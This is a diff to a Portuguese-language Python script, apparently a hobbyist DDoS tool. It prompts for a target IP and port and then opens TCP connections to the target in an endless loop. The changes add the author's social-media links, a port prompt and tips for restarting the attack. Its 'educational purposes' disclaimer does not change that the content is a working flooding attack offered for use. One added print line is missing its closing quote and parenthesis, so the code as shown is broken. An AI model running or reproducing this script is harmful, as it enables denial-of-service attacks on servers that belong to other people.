@@ -7,16 +7,23 @@ import os
 print('AVISO LEGAL: ESTA FERRAMENTA SERVE PARA PROPÓSITOS EDUCACIONAIS USE AO SEU RISCO!!!')
 time.sleep(5)
 os.system("clear")
-print('Por chokoznet')
+print('Por chokoznet, meu github: https://github.com/ChokoNetZ')
 time.sleep(2)
 print("carregando ferramenta...")
 os.system("clear")
+#Colocação dos alvos
 alvo = input('IP do alvo: ')
-seuip = input('seuip: ')
-port = 80
+seuip = input('Seu IP: ')
+port = input('Digite a porta do IP: ') 
 attack_num = 0
 print('Começando ataque...')
-time.sleep(3)
+print('Caso o terminal pare o processo de DDos, tente executar o código novamente e alterar a port, ou verificar se o ip inserido é válido.')
+time.sleep(1)
+print('para mais dúvidas me chame no instagram: https://instagram.com/ChokoZNet
+time.sleep(2)
+os.system('clear')
+print('ataque iniciado...')
+#onde a coisa funciona :)
 def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -29,3 +36,4 @@ def attack():
         print(numerodeataque)
         
         s.close()
+#final do código
